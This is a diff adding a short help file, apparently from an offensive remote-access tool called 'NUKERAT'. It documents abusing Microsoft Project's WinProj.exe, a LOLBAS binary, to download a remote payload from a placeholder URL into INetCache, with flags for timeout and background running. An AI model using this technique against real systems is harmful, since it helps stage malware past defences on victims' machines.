@@ -1,0 +1,16 @@
+ABOUT
+    Microsoft Project Executable. LOLBAS documents remote payload
+    download into INetCache.
+
+USAGE:
+    WinProj.exe {REMOTEURL}
+
+EXAMPLES:
+    WinProj.exe {REMOTEURL}
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    WinProj.exe {REMOTEURL}
